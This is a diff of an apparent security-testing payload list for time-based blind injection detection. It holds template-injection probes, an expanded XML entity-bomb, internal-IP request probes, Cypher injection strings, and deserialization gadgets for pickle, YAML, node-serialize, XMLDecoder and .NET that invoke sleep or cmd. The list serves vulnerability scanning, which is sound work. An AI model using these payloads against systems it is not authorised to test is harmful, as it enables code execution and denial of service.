@@ -113,7 +113,6 @@ ${"freemarker.template.utility.Execute"?new()("sleep 5")}
 {%import time%}{{time.sleep(5)}}
 {{range(99999999)|join}}
 {php}sleep(5);{/php}
-@php sleep(5); @endphp
 <%=sleep(5)%>
 <%=sleep 5%>
 =sleep(5)
@@ -180,7 +179,7 @@ Start-Sleep -Seconds 5
 [System.Threading.Thread]::Sleep(5000)
 Thread.sleep(5000)
 new GroovyShell().evaluate('Thread.sleep(5000)')
-<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "1337"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]><root>&lol3;</root>
+<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "ABCDEFGHIJ"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;">]><root>&lol6;</root>
 http://10.255.255.1/
 http://192.0.2.1/
 http://198.51.100.1/
@@ -218,11 +217,11 @@ Runtime.getRuntime().exec("sleep 5")
 ') WITH 1 AS x CALL apoc.util.sleep(5000) RETURN x //
 ' WITH 1 AS x UNWIND range(1,10000000) AS y RETURN count(y) //
 ') WITH 1 AS x UNWIND range(1,10000000) AS y RETURN count(y) //
-Y29zCnN5c3RlbQooUydzbGVlcCA1Jwp0Ui4=
-gAJjcG9zaXgKc3lzdGVtCnEAWAcAAABzbGVlcCA1cQGFcQJScQMu
-gASVIgAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAdzbGVlcCA1lIWUUpQu
-!!python/object/apply:os.system ["sleep 5"]
+Y3RpbWUKc2xlZXAKKEk1CnRSLg==
+gAJjdGltZQpzbGVlcApxAEsFhXEBUnECLg==
+gASVGAAAAAAAAACMBHRpbWWUjAVzbGVlcJSTlEsFhZRSlC4=
+!!python/object/apply:time.sleep [5]
 {"py/reduce":[{"py/function":"time.sleep"},{"py/tuple":[5]}]}
-{"rce":"_$$ND_FUNC$$_function(){require('child_process').execSync('sleep 5')}()"}
+{"rce":"_$$ND_FUNC$$_function(){var d=Date.now()+5000;while(Date.now()<d){}}()"}
 <java version="1.8.0" class="java.beans.XMLDecoder"><object class="java.lang.Thread" method="sleep"><long>5000</long></object></java>
 {"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"$type":"System.Diagnostics.Process, System","StartInfo":{"$type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c timeout 5"}}}
